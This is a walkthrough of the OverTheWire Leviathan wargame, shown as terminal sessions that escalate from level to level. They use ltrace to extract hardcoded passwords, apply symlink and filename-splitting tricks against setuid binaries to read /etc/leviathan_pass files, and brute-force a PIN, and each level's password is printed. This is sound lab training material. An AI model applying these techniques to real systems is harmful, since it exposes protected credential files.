# leviathan0
leviathan0

# leviathan1
```
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan0@leviathan:~$ cd .backup
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep password
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

# leviathan2
```
leviathan1@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 7452 Aug 26  2019 check
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan1@leviathan:~$ ./check
password: 1234
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
printf("password: ")                                     = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: 1234
)                    = 49
getchar(1, 0, 0x65766f6c, 0x646f6700)                    = 50
getchar(1, 0, 0x65766f6c, 0x646f6700)                    = 51
strcmp("123", "sex")                                     = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                     = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

# leviathan3
```
leviathan2@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ cd /tmp
leviathan2@leviathan:/tmp$ mkdir bandito
leviathan2@leviathan:/tmp$ cd bandito
leviathan2@leviathan:/tmp/bandito$ touch test.txt
leviathan2@leviathan:/tmp/bandito$ ltrace ~/printfile test.txt
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("test.txt", 4)                                    = 0
snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
geteuid()                                                = 12002
geteuid()                                                = 12002
setreuid(12002, 12002)                                   = 0
system("/bin/cat test.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++
leviathan2@leviathan:/tmp/bandito$ ln -s /etc/leviathan_pass/leviathan3
leviathan2@leviathan:/tmp/bandito$ mv leviathan3 pass
leviathan2@leviathan:/tmp/bandito$ touch "pass file.txt"
leviathan2@leviathan:/tmp/bandito$ ~/printfile "pass file.txt"
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
```

# leviathan4
```
leviathan3@leviathan:~$ ls -la
total 32
drwxr-xr-x  2 root       root        4096 Aug 26  2019 .
drwxr-xr-x 10 root       root        4096 Aug 26  2019 ..
-rw-r--r--  1 root       root         220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root        3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan4 leviathan3 10288 Aug 26  2019 level3
-rw-r--r--  1 root       root         675 May 15  2017 .profile
leviathan3@leviathan:~$ ./level3
Enter the password> bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                               = -1
printf("Enter the password> ")                           = 20
fgets(Enter the password> pass
"pass\n", 256, 0xf7fc55a0)                         = 0xffffd5a0
strcmp("pass\n", "snlprintf\n")                          = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                               = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

# leviathan5
```
leviathan4@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Aug 26  2019 .
drwxr-xr-x 10 root root       4096 Aug 26  2019 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 Aug 26  2019 .trash
leviathan4@leviathan:~$ cd .trash
leviathan4@leviathan:~/.trash$ ls -la
total 16
dr-xr-x--- 2 root       leviathan4 4096 Aug 26  2019 .
drwxr-xr-x 3 root       root       4096 Aug 26  2019 ..
-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26  2019 bin
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
leviathan4@leviathan:~/.trash$ which bc
/usr/bin/bc
leviathan4@leviathan:~/.trash$ chrbin() {
>         echo $(printf \\$(echo "ibase=2; obase=8; $1" | bc))
> }
leviathan4@leviathan:~/.trash$
leviathan4@leviathan:~/.trash$ bin2ascii() {
>     for bin in $*
>     do
>         chrbin $bin | tr -d '\n'
>     done
> }
leviathan4@leviathan:~/.trash$ bins="$(./bin)"
4cokeileviathan4@leviathan:~/.trash$ bin2ascii "$bins"
Tith4cokei
```

# leviathan6
```
leviathan5@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                              = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                        = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

# leviathan7
```
leviathan6@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 7452 Aug 26  2019 leviathan6
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ltrace ./leviathan6 1234
__libc_start_main(0x804853b, 2, 0xffffd784, 0x80485e0 <unfinished ...>
atoi(0xffffd8b7, 0, 0xf7e40890, 0x804862b)               = 1234
puts("Wrong"Wrong
)                                            = 6
+++ exited (status 0) +++
leviathan6@leviathan:~$ for i in $(seq -f "%04g" 0 9999); do echo $i && ./leviathan6 $i ; done
...
7121
Wrong
7122
Wrong
7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```

# fin
```
leviathan7@leviathan:~$ ls -la
total 24
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r--r-----  1 leviathan7 leviathan7  178 Aug 26  2019 CONGRATULATIONS
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```
